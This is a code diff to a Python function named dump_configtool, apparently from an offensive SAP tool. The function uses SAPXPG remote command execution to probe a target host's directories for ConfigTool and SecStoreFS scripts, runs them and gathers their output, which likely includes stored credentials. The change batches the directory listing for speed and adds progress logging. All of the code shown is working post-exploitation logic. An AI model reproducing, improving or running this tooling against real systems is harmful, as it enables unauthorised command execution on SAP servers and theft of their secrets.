@@ -261,26 +261,45 @@ def dump_configtool(sid: str,
             cfg_dirs.append(_expand(tmpl, d))
 
     # Step 3.  Discover which tools exist on disk before invoking.
-    # `/usr/bin/test -x <path>` returns exit 0 with no output for
-    # executables — but SAPXPG's P4 doesn't surface exit codes
-    # reliably.  Use `/bin/ls -la <path>` instead: if the path exists
-    # we get a line back, if not we get "No such file or directory".
-    log(f"[*] configtool: probing {len(cfg_dirs)} candidate directories "
-        f"for {len(attempts)} tool(s) each …")
+    # Batched: one `ls <dir>` per directory returns every file in it;
+    # we then local-match each tool name against that file list.
+    # This reduces SAPXPG round-trips from N_dirs * N_tools (168 for
+    # a typical Java box) down to just N_dirs (12) — ~14x faster.
+    tool_names = sorted({t for t, _, _ in attempts})
+    log(f"[*] configtool: probing {len(cfg_dirs)} candidate "
+        f"directories for {len(tool_names)} tool(s): "
+        f"{', '.join(tool_names)}")
     present = []   # list of (full_path, args, name)
-    for d in cfg_dirs:
+    dir_file_cache = {}  # dir -> set(filenames)
+    for i, d in enumerate(cfg_dirs, 1):
+        log(f"[*] configtool:   [{i}/{len(cfg_dirs)}] ls {d}")
+        r = run_cmd("/bin/ls", d)
+        lines = r.get("output") or []
+        joined = " ".join(str(x) for x in lines).lower()
+        if (not joined or "no such file" in joined
+                or "cannot access" in joined
+                or "does not exist" in joined
+                or "not a directory" in joined):
+            log(f"[*] configtool:     (missing)")
+            dir_file_cache[d] = set()
+            continue
+        # Split on whitespace — each token is one filename.  ls without
+        # flags prints filenames separated by newlines or padded cols;
+        # both reduce to a whitespace split.
+        files = set()
+        for line in lines:
+            for tok in str(line).split():
+                if tok:
+                    files.add(tok)
+        dir_file_cache[d] = files
+        matches = sorted(t for t in tool_names if t in files)
+        log(f"[*] configtool:     {len(files)} entries, "
+            f"{len(matches)} tool hit(s)"
+            f"{': ' + ', '.join(matches) if matches else ''}")
+        # Add every (tool, args) combo we'll invoke for present tools
         for (tool, args, _needs_env) in attempts:
-            full = f"{d}/{tool}"
-            r = run_cmd("/bin/ls", full)
-            lines = r.get("output") or []
-            joined = " ".join(str(x) for x in lines).lower()
-            if not joined:
-                continue
-            if ("no such file" in joined or
-                "cannot access" in joined or
-                "does not exist" in joined):
-                continue
-            present.append((full, args, tool))
+            if tool in files:
+                present.append((f"{d}/{tool}", args, tool))
     if not present:
         result["error"] = (
             "none of the candidate ConfigTool / SecStoreFS scripts / "
@@ -293,27 +312,33 @@ def dump_configtool(sid: str,
             "to locate them, then pass inst_dir / tool paths directly.")
         log(f"[-] configtool: {result['error']}")
         return result
-    log(f"[+] configtool: found {len(present)} tool(s) on target: "
-        f"{', '.join(sorted(set(p[2] for p in present)))}")
+    tools_found = sorted(set(p[2] for p in present))
+    log(f"[+] configtool: probe complete — {len(present)} invocation(s) "
+        f"queued across {len(tools_found)} distinct tool(s) "
+        f"({', '.join(tools_found)})")
 
     # Step 4.  Invoke each tool directly via SAPXPG.  Aggregate output.
+    # Each call is its own round-trip (~1-3 s) so progress is logged per
+    # invocation to make the long-running step feel responsive.
     all_output = []
-    for full_path, args, tool_name in present:
-        log(f"[*] configtool: running {full_path} {args} …")
+    for idx, (full_path, args, tool_name) in enumerate(present, 1):
+        log(f"[*] configtool: [{idx}/{len(present)}] exec "
+            f"{full_path} {args} …")
         r = run_cmd(full_path, args)
         lines = r.get("output") or []
         snippet = "\n".join(str(l) for l in lines).strip()
         err = (r.get("error") or "").strip()
         if not snippet and err:
-            log(f"[!] configtool:   error: {err[:200]}")
+            log(f"[!] configtool:     error: {err[:200]}")
             continue
         if not snippet:
             # Some tools write only to stderr on success (help text) —
             # a short "no output" line keeps the aggregate readable.
-            log(f"[*] configtool:   (no output)")
+            log(f"[*] configtool:     (no output)")
             continue
-        log(f"[+] configtool:   {len(snippet)} B back "
-            f"({len(lines)} lines)")
+        first_line = str(lines[0])[:100] if lines else ""
+        log(f"[+] configtool:     {len(snippet)} B back "
+            f"({len(lines)} lines){' — ' + first_line if first_line else ''}")
         header = f"=== {full_path} {args} ==="
         all_output.append(f"{header}\n{snippet}\n")
         result["successful_commands"].append({
